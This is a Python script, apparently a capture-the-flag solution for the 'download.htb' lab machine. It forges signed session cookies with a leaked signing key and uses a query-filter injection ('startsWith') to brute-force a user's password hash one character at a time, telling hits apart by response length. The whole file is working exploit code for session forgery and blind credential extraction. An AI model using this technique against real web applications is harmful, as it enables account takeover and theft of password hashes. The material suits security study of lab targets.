import string
import requests
import json
import requests
import subprocess

password = ''
chars = "abcdef0123456789" # Hashes only have these characters
test = '' 

def generate(c):
	query = {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":c}}}
	with open("cookie.json","w") as f:
		f.write(json.dumps(query))
	output = subprocess.check_output(["./cookie-monster.js", "-e", "-f", "cookie.json", "-k", "8929874489719802418902487651347865819634518936754", "-n", "download_session"]).decode().replace("\n"," ")

	jwt = output.split("download_session=")[1]
	jwt = jwt.split(" ")[0]
	jwt = jwt.split("\x1b")[0]
	sig = output.split("download_session.sig=")[1]
	sig = sig.split("\x1b")[0]
	return jwt,sig

for i in range(32):
	for c in chars:
		test = password + c
		jwt, sig = generate(test)
		cookie = {"download_session": jwt, "download_session.sig": sig}
		r = requests.get('http://download.htb/home/', cookies=cookie)
		if len(r.text) != 2174:
			print(f"Found char: {c}")
			password += c
			print(password)
			break

print(password)
